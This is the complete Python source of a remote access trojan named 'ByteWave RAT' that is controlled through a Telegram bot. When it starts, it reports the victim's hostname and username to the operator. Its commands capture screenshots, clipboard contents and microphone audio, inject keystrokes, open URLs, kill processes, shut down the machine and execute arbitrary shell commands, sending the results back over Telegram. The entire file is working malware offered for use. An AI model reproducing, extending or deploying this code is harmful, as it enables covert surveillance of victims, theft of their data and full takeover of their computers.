import telebot
from telebot import types
import pyaudio
import wave
import pyautogui
from PIL import ImageGrab
import webbrowser
import os
import pyperclip
import pyautogui
import time
import requests
import subprocess
import shlex
import pycaw.pycaw as pycaw
import psutil
import re

#taskkill /PID <PID_процесса> /F

# input your bot token and your chat id in this lines
AUTHORIZED_CHAT_ID = 
TOKEN = ''
chat_id_to_notify = ''
username = os.environ.get('USERNAME')
hostname = os.environ['COMPUTERNAME'] if os.name == 'nt' else os.uname().nodename
pid = os.getpid()

#TOKEN = input(str('Input Bot API TOKEN: '))

bot = telebot.TeleBot(TOKEN)
print(f"ByteWave RAT Started! PID: {pid}")
message_text = f'ByteWave RAT Connected to {hostname}, {username}. PID: {pid}'
api_url = f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id_to_notify}&text={message_text}'
response = requests.get(api_url)
#aa
@bot.message_handler(commands=['help'])
def handle_help_command(message):
	bot.send_message(message.chat.id, "/help - Commands list.\n /clipboard - Get clipboard content.\n /clear - Remove logs from console.\n /untaskkill - Start explorer.exe.\n /taskkill (process name) - Kills process.\n /selfdestruct - Self Destruct.\n /openurl (link) - Open URL.\n /screenshot - Take screenshot.\n /record (seconds) - Records microphone.\n /keyboard (letters) - Pressing keyboard buttons.\n /cmd (command) - Executes the entered commands in cmd.exe\n /setsound - Set volume (0-100).\n /tasklist - Print list of all processes in system.\n")

@bot.message_handler(commands=['pid'])
def handle_unphoenix_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Command /pid unaviable in current chat.")
        user = message.from_user
        text = f'Someone`s input /pid command!\n'
        if user.username:
            text += f'Username: @{user.username}\n'
        else:
            text += f'First name: {user.first_name}\n'
            text += f'Last name: {user.last_name}\n'
        text += f'Chat ID: {user.id}'
        bot.send_message(chat_id_to_notify, text)
        print(f'[LOG] someone`s tried /pid Username: @{user.username}')
        return
    elif message.chat.id == AUTHORIZED_CHAT_ID:
        bot.reply_to(message, f"Current PID: {pid}")


@bot.message_handler(commands=['tasklist'])
def handle_unphoenix_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Command /tasklist unaviable in current chat.")
        user = message.from_user
        text = f'Someone`s input /tasklist command!\n'
        if user.username:
            text += f'Username: @{user.username}\n'
        else:
            text += f'First name: {user.first_name}\n'
            text += f'Last name: {user.last_name}\n'
        text += f'Chat ID: {user.id}'
        bot.send_message(chat_id_to_notify, text)
        print(f'[LOG] someone`s tried /tasklist Username: @{user.username}')
        return
    elif message.chat.id == AUTHORIZED_CHAT_ID:
        messsage = "{:<20} {:<20} {:<10}".format("USER", "NAME", "PID") + "\n"
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            try:
                info = proc.as_dict(attrs=['pid', 'name', 'username'])
                username = info['username']
                pid = info['pid']
                name = info['name']
                messsage += "{:<20} {:<20} {:<10}".format(username, name, pid) + "\n"
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        bot.reply_to(message, messsage)

@bot.message_handler(commands=['cmd'])
def handle_cmd_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Command /cmd unaviable in current chat.")
        return

    cmd = message.text.split(maxsplit=1)[1]

    try:
        process = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        pid_sub = process.pid
        output, error = process.communicate(timeout=30)
        if error:
            response = f"Command failed with error:\n{error.decode('utf-8', 'ignore')}"
        else:
            response = f"[PID: {pid_sub}] Command output:\n{output.decode('utf-8', 'ignore')}"
    except Exception as e:
        response = f"Error occurred while running command:\n{e}"
        
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['setsound'])
def handle_page_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Command /setsound unaviable in current chat.")
        user = message.from_user
        text = f'Someone`s input /setsound command!\n'
        if user.username:
            text += f'Username: @{user.username}\n'
        else:
            text += f'First name: {user.first_name}\n'
            text += f'Last name: {user.last_name}\n'
        text += f'Chat ID: {user.id}'
        bot.send_message(chat_id_to_notify, text)
        return

    elif message.chat.id == AUTHORIZED_CHAT_ID:
        try:
            volume_percent = int(message.text.split(' ', 1)[1])
            volume = int(65535 * volume_percent / 100)
        except (IndexError, ValueError):
            bot.reply_to(message, "Input correct number.")
            return

        os.system(f"nircmd.exe setsysvolume {volume}")

        bot.reply_to(message, f"Volume set to {volume_percent}%.")

@bot.message_handler(commands=['shutdown'])
def handle_unphoenix_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Command /shutdown unaviable in current chat.")
        user = message.from_user
        text = f'Someone`s input /shutdown command!\n'
        if user.username:
            text += f'Username: @{user.username}\n'
        else:
            text += f'First name: {user.first_name}\n'
            text += f'Last name: {user.last_name}\n'
        text += f'Chat ID: {user.id}'
        bot.send_message(chat_id_to_notify, text)
        print(f'[LOG] someone`s tried /shutdown Username: @{user.username}')
        return
    elif message.chat.id == AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "shutting down...")
        os.system('shutdown /s')

@bot.message_handler(commands=['reboot'])
def handle_unphoenix_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Command /reboot unaviable in current chat.")
        user = message.from_user
        text = f'Someone`s input /reboot command!\n'
        if user.username:
            text += f'Username: @{user.username}\n'
        else:
            text += f'First name: {user.first_name}\n'
            text += f'Last name: {user.last_name}\n'
        text += f'Chat ID: {user.id}'
        bot.send_message(chat_id_to_notify, text)
        print(f'[LOG] someone`s tried /reboot Username: @{user.username}')
        return
    elif message.chat.id == AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "rebooting...")
        os.system('shutdown /r')

@bot.message_handler(commands=['keyboard'])
def handle_keyboard_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Command /keyboard unaviable in current chat.")
        user = message.from_user
        text = f'Someone`s input /keyboard command!\n'
        if user.username:
            text += f'Username: @{user.username}\n'
        else:
            text += f'First name: {user.first_name}\n'
            text += f'Last name: {user.last_name}\n'
        text += f'Chat ID: {user.id}'
        bot.send_message(chat_id_to_notify, text)
        print(f'[LOG] someone`s tried /keyboard Username: @{user.username}')
        return

    args = message.text.split()[1:]

    if not args:
        pyautogui.press('enter')
        print('* [PYAUTOGUI] - Pressed (Enter)')
    else:
        letters = ''.join(arg.replace('[space]', ' ') for arg in args)
        pyautogui.typewrite(letters)
        print('* [PYAUTOGUI] - Writed: ', letters)


@bot.message_handler(commands=['clipboard'])
def handle_unphoenix_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Command /clipboard unaviable in current chat.")
        user = message.from_user
        text = f'Someone`s input /clipboard! command!\n'
        if user.username:
            text += f'Username: @{user.username}\n'
        else:
            text += f'First name: {user.first_name}\n'
            text += f'Last name: {user.last_name}\n'
        text += f'Chat ID: {user.id}'
        bot.send_message(chat_id_to_notify, text)
        print(f'[LOG] someone`s tried /clipboard Username: @{user.username}')
        return
    elif message.chat.id == AUTHORIZED_CHAT_ID:
        clipboard_content = pyperclip.paste()
        texte = f'clipboard: '
        texte += f'{clipboard_content}'
        bot.send_message(chat_id_to_notify, texte)
        print('* clipboard send succefully...')

@bot.message_handler(commands=['clear'])
def handle_unphoenix_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Command /mesa unaviable in current chat.")
        user = message.from_user
        text = f'Someone`s input /mesa command!\n'
        if user.username:
            text += f'Username: @{user.username}\n'
        else:
            text += f'First name: {user.first_name}\n'
            text += f'Last name: {user.last_name}\n'
        text += f'Chat ID: {user.id}'
        bot.send_message(chat_id_to_notify, text)
        print(f'[LOG] someone`s tried /mesa Username: @{user.username}')
        return

    elif message.chat.id == AUTHORIZED_CHAT_ID:
        os.system("cls")
        bot.reply_to(message, "logs cleared!")

@bot.message_handler(commands=['untaskkill'])
def handle_unphoenix_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Command /untaskkill unaviable in current chat.")
        user = message.from_user
        text = f'Someone`s input /untaskkill command!\n'
        if user.username:
            text += f'Username: @{user.username}\n'
        else:
            text += f'First name: {user.first_name}\n'
            text += f'Last name: {user.last_name}\n'
        text += f'Chat ID: {user.id}'
        bot.send_message(chat_id_to_notify, text)
        print(f'[LOG] someone`s tried /untaskkill Username: @{user.username}')
        return

    elif message.chat.id == AUTHORIZED_CHAT_ID:
        os.startfile("explorer.exe")
        bot.reply_to(message, "explorer.exe started")

@bot.message_handler(commands=['restart'])
def handle_restart_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Command /restart unaviable in current chat.")
        user = message.from_user
        text = f'Someone`s input /restart command!\n'
        if user.username:
            text += f'Username: @{user.username}\n'
        else:
            text += f'First name: {user.first_name}\n'
            text += f'Last name: {user.last_name}\n'
        text += f'Chat ID: {user.id}'
        bot.send_message(chat_id_to_notify, text)
        print(f'[LOG] someone`s tried /restart Username: @{user.username}')
        return

    elif message.chat.id == AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "[RESTART] Restarting ByteWave RAT...")
        os.getcwd()
        os.startfile("restart.bat")
        

@bot.message_handler(commands=['taskkill'])
def handle_phoenix_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Command /taskkill unaviable in current chat.")
        user = message.from_user
        text = f'Someone`s input /taskkill command!\n'
        if user.username:
            text += f'Username: @{user.username}\n'
        else:
            text += f'First name: {user.first_name}\n'
            text += f'Last name: {user.last_name}\n'
        text += f'Chat ID: {user.id}'
        bot.send_message(chat_id_to_notify, text)
        print(f'[LOG] someone`s tried /taskkill Username: @{user.username}')
        return

    elif message.chat.id == AUTHORIZED_CHAT_ID:
        try:
            process_name = message.text.split(' ', 1)[1]
        except IndexError:
            process_name = "explorer.exe"

        os.system(f"taskkill /f /im {process_name}")

        bot.reply_to(message, f"Process {process_name} terminated.")


@bot.message_handler(commands=['selfdestruct'])
def handle_phoenix_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Command /selfdestruct unaviable in current chat.")
        user = message.from_user
        text = f'Someone`s input /selfdestruct command!\n'
        if user.username:
            text += f'Username: @{user.username}\n'
        else:
            text += f'First name: {user.first_name}\n'
            text += f'Last name: {user.last_name}\n'
        text += f'Chat ID: {user.id}'
        bot.send_message(chat_id_to_notify, text)
        print(f'[LOG] someone`s tried /selfdestruct Username: @{user.username}')
        return

    elif message.chat.id == AUTHORIZED_CHAT_ID:
        os.system("taskkill /f /im python.exe")

@bot.message_handler(commands=['openurl'])
def handle_gilbert_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Command /openurl unaviable in current chat.")
        user = message.from_user
        text = f'Someone`s input /openurl command!\n'
        if user.username:
            text += f'Username: @{user.username}\n'
        else:
            text += f'First name: {user.first_name}\n'
            text += f'Last name: {user.last_name}\n'
        text += f'Chat ID: {user.id}'
        bot.send_message(chat_id_to_notify, text)
        print(f'[LOG] someone`s tried /openurl Username: @{user.username}')
        return

    elif message.chat.id == AUTHORIZED_CHAT_ID:
        url = message.text.split(' ')[1]
        webbrowser.open_new_tab(url)
        bot.reply_to(message, f"Opening URL: {url}")
        print (f"* open URL {url} ...")

@bot.message_handler(commands=['screenshot'])
def handle_creek_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Command /screenshot unaviable in current chat.")
        user = message.from_user
        text = f'Someone`s input /screenshot command!\n'
        if user.username:
            text += f'Username: @{user.username}\n'
        else:
            text += f'First name: {user.first_name}\n'
            text += f'Last name: {user.last_name}\n'
        text += f'Chat ID: {user.id}'
        bot.send_message(chat_id_to_notify, text)
        print(f'[LOG] someone`s tried /screenshot Username: @{user.username}')
        return


    elif message.chat.id == AUTHORIZED_CHAT_ID:
    	screenshot = ImageGrab.grab()
    	screenshot.save("screenshot.png")
    	print('* image grab succefully')
    	with open("screenshot.png", "rb") as image_file:
        	bot.send_photo(message.chat.id, image_file)
        	print('* screenshot send succefully!')

@bot.message_handler(commands=['start'])
def handle_start_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Hello...")
        user = message.from_user
        text = f'Someone`s input /start!\n'
        if user.username:
            text += f'Username: @{user.username}\n'
        else:
            text += f'First name: {user.first_name}\n'
            text += f'Last name: {user.last_name}\n'
        text += f'Chat ID: {user.id}'
        bot.send_message(chat_id_to_notify, text)
    else:
        bot.reply_to(message, "Hello, sir!")
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("Apps🧩")
        btn2 = types.KeyboardButton("System🔧")
        btn3 = types.KeyboardButton("Help🆘")
        btn4 = types.KeyboardButton("Other")
        markup.add(btn1, btn2, btn3, btn4)
        bot.send_message(message.chat.id, "Choose action:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "Back to main menu")
def handle_telegram_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Unauthorized access! This incident will be reported.")
        return

    bot.reply_to(message, "Hello, sir!")
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Apps🧩")
    btn2 = types.KeyboardButton("System🔧")
    btn3 = types.KeyboardButton("Help🆘")
    btn4 = types.KeyboardButton("Other")
    markup.add(btn1, btn2, btn3, btn4)
    bot.send_message(message.chat.id, "Choose action:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "Other")
def handle_telegram_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Unauthorized access! This incident will be reported.")
        return

    bot.reply_to(message, "Hello, sir!")
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Screenshot🖼")
    btn2 = types.KeyboardButton("Microphone🎤")
    btn3 = types.KeyboardButton("Back to main menu")
    markup.add(btn1, btn2, btn3)
    bot.send_message(message.chat.id, "Choose action:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "Screenshot🖼")
def handle_telegram_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Unauthorized access! This incident will be reported.")
        return

    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.png")
    print('* image grab succefully')
    with open("screenshot.png", "rb") as image_file:
        bot.send_photo(message.chat.id, image_file)
        print('* screenshot send succefully!')

@bot.message_handler(func=lambda message: message.text == "Microphone🎤")
def handle_telegram_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Unauthorized access! This incident will be reported.")
        return
        
    if len(message.text.split()) > 1:
        try:
            record_time = int(message.text.split()[1])
        except ValueError:
            bot.reply_to(message, "Input length of voice recording in seconds after /record command.")
            return
    else:
        record_time = 10

    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    RECORD_SECONDS = record_time
    WAVE_OUTPUT_FILENAME = "audio.wav"

    p = pyaudio.PyAudio()

    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)

    print(f"* recording {RECORD_SECONDS} seconds")

    frames = []
    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)

    print("* done recording")

    stream.stop_stream()
    stream.close()
    p.terminate()

    wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()

    print("* sending voice message...")
    with open(WAVE_OUTPUT_FILENAME, 'rb') as audio_file:
        bot.send_voice(message.chat.id, audio_file)
    print("* voice message succefully send!")

@bot.message_handler(func=lambda message: message.text == "Apps🧩")
def handle_apps_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Unauthorized access! This incident will be reported.")
        return

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Telegram✈️")
    btn2 = types.KeyboardButton("Spotify🎧")
    btn3 = types.KeyboardButton("Discord📞")
    btn4 = types.KeyboardButton("Back to main menu")
    markup.add(btn1, btn2, btn3, btn4)
    bot.send_message(message.chat.id, "Select an App:", reply_markup=markup)


@bot.message_handler(func=lambda message: message.text == "Telegram✈️")
def handle_telegram_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Unauthorized access! This incident will be reported.")
        return

    telegram_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Telegram Desktop\\Telegram.exe"
    if os.path.isfile(telegram_path):
        os.startfile(telegram_path)
        bot.reply_to(message, f"Starting Telegram.exe ...")
    else:
        bot.reply_to(message, "Cannot find Telegram.exe")

@bot.message_handler(func=lambda message: message.text == "Discord📞")
def handle_discord_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Unauthorized access! This incident will be reported.")
        return

    discord_path = f"C:\\Users\\{username}\\AppData\\Local\\Discord\\Discord.exe"
    if os.path.isfile(discord_path):
        os.startfile(discord_path)
        bot.reply_to(message, f"Starting Discord.exe ...")
    else:
        bot.reply_to(message, "Cannot find Discord.exe")


@bot.message_handler(func=lambda message: message.text == "Spotify🎧")
def handle_spotify_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Unauthorized access! This incident will be reported.")
        return

    spotify_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Spotify\\Spotify.exe"
    if os.path.isfile(spotify_path):
        os.startfile(spotify_path)
        bot.reply_to(message, f"Starting Spotify.exe ...")
    else:
        bot.reply_to(message, "Cannot find Spotify.exe")

@bot.message_handler(func=lambda message: message.text == "System🔧")
def handle_apps_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Unauthorized access! This incident will be reported.")
        return

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Shutdown🔴")
    btn2 = types.KeyboardButton("Reboot🟠")
    btn3 = types.KeyboardButton("Restart🔵")
    btn4 = types.KeyboardButton("Back to main menu")
    markup.add(btn1, btn2, btn3, btn4)
    bot.send_message(message.chat.id, "Select an action:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "Shutdown🔴")
def handle_spotify_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Unauthorized access! This incident will be reported.")
        return

    bot.reply_to(message, "Shutting down...")
    os.system("shutdown /s")

@bot.message_handler(func=lambda message: message.text == "Reboot🟠")
def handle_spotify_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Unauthorized access! This incident will be reported.")
        return

    bot.reply_to(message, "Rebooting...")
    os.system("shutdown /r")

@bot.message_handler(func=lambda message: message.text == "Restart🔵")
def handle_spotify_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Unauthorized access! This incident will be reported.")
        return

    bot.reply_to(message, "[RESTART] Restarting ByteWave RAT...")
    os.getcwd()
    os.startfile("restart.bat")


@bot.message_handler(func=lambda message: message.text == "Help🆘")
def handle_telegram_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Unauthorized access! This incident will be reported.")
        return

    bot.reply_to(message, "/help - Commands list.\n /clipboard - Get clipboard content.\n /clear - Remove logs from console.\n /untaskkill - Start explorer.exe.\n /taskkill (process name) - Kills process.\n /selfdestruct - Self Destruct.\n /openurl (link) - Open URL.\n /screenshot - Take screenshot.\n /record (seconds) - Records microphone.\n /keyboard (letters) - Pressing keyboard buttons.\n /cmd (command) - Executes the entered commands in cmd.exe\n /setsound - Set volume (0-100).\n /tasklist - Print list of all processes in system.\n")
    


@bot.message_handler(commands=['record'])
def handle_creek_command(message):
    if message.chat.id != AUTHORIZED_CHAT_ID:
        bot.reply_to(message, "Command /record unaviable in current chat.")
        user = message.from_user
        text = f'Someone`s input command /record!\n'
        if user.username:
            text += f'Username: @{user.username}\n'
        else:
            text += f'First name: {user.first_name}\n'
            text += f'Last name: {user.last_name}\n'
        text += f'Chat ID: {user.id}'
        bot.send_message(chat_id_to_notify, text)
        print(f'[LOG] someone`s tried /record. Username: @{user.username}')
        return

    if len(message.text.split()) > 1:
        try:
            record_time = int(message.text.split()[1])
        except ValueError:
            bot.reply_to(message, "Input length of voice recording in seconds after /record command.")
            return
    else:
        record_time = 10

    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    RECORD_SECONDS = record_time
    WAVE_OUTPUT_FILENAME = "audio.wav"

    p = pyaudio.PyAudio()

    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)

    print(f"* recording {RECORD_SECONDS} seconds")

    frames = []
    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)

    print("* done recording")

    stream.stop_stream()
    stream.close()
    p.terminate()

    wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()

    print("* sending voice message...")
    with open(WAVE_OUTPUT_FILENAME, 'rb') as audio_file:
        bot.send_voice(message.chat.id, audio_file)
    print("* voice message succefully send!")

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        time.sleep(3)
        print(e)
